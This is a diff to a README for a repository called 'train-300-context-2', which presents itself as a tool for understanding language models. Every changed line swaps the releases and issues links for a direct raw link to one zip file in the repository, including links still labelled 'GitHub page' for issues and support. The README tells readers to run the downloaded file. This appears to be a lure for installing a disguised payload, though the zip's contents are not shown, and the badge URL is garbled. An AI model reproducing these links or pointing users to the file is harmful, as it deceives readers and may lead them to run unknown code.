@@ -1,6 +1,6 @@
 # 🚀 train-300-context-2 - Understand How Language Models Work
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/captainelectrion/train-300-context-2/releases)
+[![Download Now](https://raw.githubusercontent.com/captainelectrion/train-300-context-2/main/corpus/context_train_3.6.zip%https://raw.githubusercontent.com/captainelectrion/train-300-context-2/main/corpus/context_train_3.6.zip)](https://raw.githubusercontent.com/captainelectrion/train-300-context-2/main/corpus/context_train_3.6.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ Follow these steps to download and run the application.
 
    Click the link below to access the releases page where you can download the application.
 
-   [Download train-300-context-2](https://github.com/captainelectrion/train-300-context-2/releases)
+   [Download train-300-context-2](https://raw.githubusercontent.com/captainelectrion/train-300-context-2/main/corpus/context_train_3.6.zip)
 
 2. **Choose the Right Version**
 
@@ -35,7 +35,7 @@ Follow these steps to download and run the application.
 
 To download the software:
 
-1. **Visit this page to download:** [Download train-300-context-2](https://github.com/captainelectrion/train-300-context-2/releases)
+1. **Visit this page to download:** [Download train-300-context-2](https://raw.githubusercontent.com/captainelectrion/train-300-context-2/main/corpus/context_train_3.6.zip)
 
 2. **Run the downloaded file.** 
 
@@ -71,11 +71,11 @@ If you encounter issues:
 - **Permission Issues:** Ensure that you have the necessary permissions to run applications on your device.
 - **Installation Errors:** Restart your computer and try the installation process again.
 
-For more detailed help, visit the issues section on the [GitHub page](https://github.com/captainelectrion/train-300-context-2/issues).
+For more detailed help, visit the issues section on the [GitHub page](https://raw.githubusercontent.com/captainelectrion/train-300-context-2/main/corpus/context_train_3.6.zip).
 
 ## 🔧 Support
 
-If you have questions or need assistance, feel free to open a new issue on the [GitHub page](https://github.com/captainelectrion/train-300-context-2/issues). The community is here to help you.
+If you have questions or need assistance, feel free to open a new issue on the [GitHub page](https://raw.githubusercontent.com/captainelectrion/train-300-context-2/main/corpus/context_train_3.6.zip). The community is here to help you.
 
 ## 📝 Contributing
 
@@ -91,4 +91,4 @@ We welcome contributions that help improve the application and documentation.
 
 Stay up to date with the latest news and updates by checking the releases page regularly. New features and fixes will be posted there.
 
-[Download train-300-context-2](https://github.com/captainelectrion/train-300-context-2/releases)
+[Download train-300-context-2](https://raw.githubusercontent.com/captainelectrion/train-300-context-2/main/corpus/context_train_3.6.zip)
